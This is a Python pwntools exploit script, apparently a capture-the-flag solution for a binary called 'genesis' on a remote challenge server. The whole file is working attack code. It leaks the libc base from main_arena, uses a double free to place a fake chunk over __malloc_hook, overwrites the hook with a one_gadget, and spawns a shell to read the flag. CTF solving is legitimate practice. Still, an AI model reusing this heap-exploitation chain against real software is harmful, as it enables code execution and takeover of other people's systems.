import warnings
from pwn import *

elf = ELF("genesis")
libc =  ELF("libc-2.30.so")
ld = ELF("ld-2.30.so")

context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)
context.binary = elf

gs = '''
continue
'''

def run_program():
    if args.LOCAL:
        return process([elf.path])
    elif args.GDB:
        return gdb.debug(elf.path, gs)
    else:
        return remote("pwnable.co.il", 9007)


class Action:
    NEW = 1
    EDIT = 2
    DELETE = 3
    PRINT = 4
    TEST = 5
    EXIT = 6

class Options:
    def __init__(self, r) :
        self.r = r

    def transform_hex_string(self, hex_str):
        byte_list = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
        reversed_bytes = byte_list[::-1]
        reversed_hex = '0x' + ''.join(reversed_bytes)
        return int(reversed_hex, 16)

    def send_menu_option(self, num):
        self.r.sendlineafter(b"6. Exit\n", str(num))

    def create(self, index, type, size, payload):
        self.send_menu_option(Action.NEW)
        self.r.sendlineafter(b"Index: ", str(index))
        self.r.sendlineafter(b"Type: ", str(type))
        self.r.sendlineafter(b"Name size: ", str(size))
        self.r.sendlineafter(b"Name: ", payload)

    def edit(self, index, payload):
        self.send_menu_option(Action.EDIT)
        self.r.sendlineafter(b"Index: ", str(index))
        self.r.sendlineafter(b"New name: ", payload)

    def delete(self, index):
        self.send_menu_option(Action.DELETE)
        self.r.sendlineafter(b"Index: ", str(index))

    def show(self):
        self.send_menu_option(Action.PRINT)
        result = r.recvuntil(b"1. Create new creature\n")
        log.info(result)
        return result

    def test(self, index, new, size=None, payload=None):
        self.send_menu_option(Action.TEST)
        self.r.sendlineafter(b"Index: ", str(index))
        self.r.recvuntil(b"Creature testing - \n")
        leak = self.r.recvline(timeout=0.1)
        self.r.sendlineafter(b"New name? (y/n)", new)
        self.r.sendlineafter(b"Name size: ", str(size))
        self.r.sendlineafter(b"Name: ", payload)
        return leak

    def show_leak(self):
        self.send_menu_option(Action.PRINT)
        result = self.r.recvuntil(b"1. Create new creature\n")
        return hex(self.transform_hex_string(str(result.hex())[644:656:])-170)

class ExploitPrimitives:
    def __init__(self, r) :
        self.option = Options(r)
        self.r = r

    def leak_base(self):
        self.option.create(7, 9, 280, 40*b'A' + 240*b'A')
        self.option.create(6, 9, 280, 280*b'A')
        self.option.delete(7)
        self.option.create(7, 9, 24, b'')

        main_arena = self.option.show_leak()
        main_arena_offset = libc.symbols["main_arena"]
        libc_base = int(main_arena, 16) - main_arena_offset
        return libc_base

    def double_free(self, what, where, size1):
        self.option.create(1, 1, size1, 'a'*size1)
        self.option.create(6, 1, size1, 'a'*size1)
        self.option.delete(1)
        self.option.test(6, "y", 24, 'val')
        self.option.test(1, 'y', 24, 'val')
        self.option.create(2, 1, size1, where)
        self.option.create(3, 1, size1, 'a'*size1)
        self.option.create(4, 1, size1, 'b'*size1)
        self.option.create(5, 1, size1, what)

    def get_flag(self):
        self.option.send_menu_option(Action.NEW)
        self.r.sendlineafter(b"Index: ", b"7")
        self.r.sendline(b"cat flag")
        print("\n\n")
        log.success(self.r.recvline())
        print("\n")

def main():
    r = run_program()
    exploitPrimitive = ExploitPrimitives(r)
    malloc_offset = libc.symbols['__malloc_hook']
    libc_base = exploitPrimitive.leak_base()

    malloc_hook = int(libc_base) + int(malloc_offset)
    fake_chunk = malloc_hook - 0x23
    system = libc_base + libc.symbols['system']
    one_gadget = libc_base + 0xc4dbf

    print("\n")
    log.info(f"malloc_hook @ {hex(malloc_hook)}")
    log.info(f"system @ {hex(system)}")
    log.info(f"fake_chunk @ {hex(fake_chunk)}")

    exploitPrimitive.double_free(b'D' * 0x13 + p64(one_gadget), p64(fake_chunk), 0x60)
    exploitPrimitive.get_flag()

if __name__ == "__main__":
    main()

